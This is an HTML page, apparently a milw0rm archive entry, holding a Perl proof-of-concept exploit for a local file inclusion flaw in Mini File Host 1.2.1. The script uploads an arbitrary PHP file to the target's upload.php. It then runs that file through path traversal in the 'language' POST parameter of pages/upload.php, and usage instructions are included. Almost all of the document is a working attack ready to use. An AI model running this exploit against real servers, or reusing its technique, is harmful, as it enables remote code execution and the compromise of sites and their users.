<html><head><title>Mini File Host 1.2.1 (upload.php language) Local File Inclusion Exploit</title></head><pre>#!/usr/bin/perl
# Name: Mini File Host (1.2.1 &quot;Security Fixed release&quot; and earlier)
# Vulnerability type: Local File Inclusion through POST requests (pages/upload.php)
# Authors: 
#          Scary-Boys: original GET-vulnerability, 2008-01-17
#             shinmai: POST-request vulnerability in latest version
#                      perl POC, 2008-01-19
######################################################################################
# Description:
# The same language=LFI vulnerability is found in 1.2 is present in  thelatest version
# POST has to be used to exploit instead of GET.
#
# This POC is to be used as follows:
# perl mfh121.pl -f FILENAME.PHP -h HOSTNAME -e PATH TO MFH
#
# FILENAME.PHP is uploaded to the target script, and then executed through LFI with
# a POST request.
#
# example: perl mfh121.pl -f ./phpinfo.php -h localhost -p /mfi121/ | less
# The resulting HTML will be printed, all output by phpinfo.php will be before the
# real content.
#
use LWP::UserAgent;
use Getopt::Std;
use vars qw($opt_f $opt_h $opt_p $opt_g);

my $ua;
my $response;
my $formtarget;
my $original_filename;
my $filame;
my $scriptname;
my $exploit_target;

getopts(&quot;f:h:p:g&quot;);

$original_filename = $opt_f;
$filame = chomp($original_filename);
$formtarget = &quot;http://&quot;.$opt_h.$opt_p.&quot;upload.php?do=verify&quot;;

$ua = LWP::UserAgent-&gt;new;

$response = $ua-&gt;post( $formtarget,
  [ 'upfile' =&gt; [$original_filename], ],
  'Content_Type' =&gt; 'form-data'
);

die &quot;error: &quot;, $response-&gt;status_line
   unless $response-&gt;is_success;
if( $response-&gt;content =~ m/\.php\?file=(.*?)\&quot;&gt;/ ) {
    $scriptname = &quot;$1&quot;;
  } else {
    print &quot;Upload of php file unsuccessful&quot;;
    die ($response-&gt;status_line);
  }

$scriptname =~ s/\.[\w]{2,4}//;

$exploit_target = &quot;http://&quot;.$opt_h.$opt_p.&quot;/pages/upload.php&quot;;
$response = $ua-&gt;post( $exploit_target,
  [ 'language' =&gt; &quot;../../storage/&quot;.$scriptname, ],
  'Content_Type' =&gt; 'form-data'
);
die &quot;error running php file though LFI: &quot;, $response-&gt;status_line
   unless $response-&gt;is_success;
print $response-&gt;content;

exit(0);

# milw0rm.com [2008-01-20]</pre></html>